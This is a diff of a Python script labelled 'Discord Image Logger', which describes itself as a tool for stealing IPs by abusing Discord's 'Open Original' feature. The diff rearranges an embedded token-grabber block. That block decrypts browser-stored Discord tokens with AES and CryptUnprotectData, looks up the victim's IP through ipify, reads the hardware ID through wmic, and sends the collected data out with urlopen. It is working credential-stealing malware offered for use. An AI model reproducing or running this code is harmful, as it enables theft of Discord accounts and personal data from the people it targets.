@@ -4,6 +4,19 @@ import traceback, requests, base64, httpagentparser
 import json
 import os
 
+# ============================================
+# IMPORTS ADDITIONNELS POUR SCRIPT PERSONNEL
+# ============================================
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from os import getlogin, listdir
+from json import loads
+from re import findall
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+from datetime import datetime
+
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
@@ -54,41 +67,31 @@ config = {
     },
 }
 
-# ============================================
-# VOTRE SCRIPT PERSONNALISÉ (collez ici)
-# ============================================
-
-# Collez votre code ci-dessous (il sera exécuté automatiquement):
-
-from base64 import b64decode
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-from os import getlogin, listdir
-from json import loads
-from re import findall
-from urllib.request import Request, urlopen
-from subprocess import Popen, PIPE
-import requests, json, os
-from datetime import datetime
-
 tokens = []
 cleaned = []
 checker = []
+
+# ============================================
+# VOTRE SCRIPT PERSONNALISÉ (définitions)
+# ============================================
 
 def decrypt(buff, master_key):
     try:
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except:
         return "Error"
+
 def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
     except: pass
     return ip
+
 def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
 def get_token():
     already_check = []
     checker = []
@@ -187,8 +190,8 @@ def get_token():
                             urlopen(req)
                         except: continue
                 else: continue
-if __name__ == '__main__':
-    get_token()
+
+
 
 
 
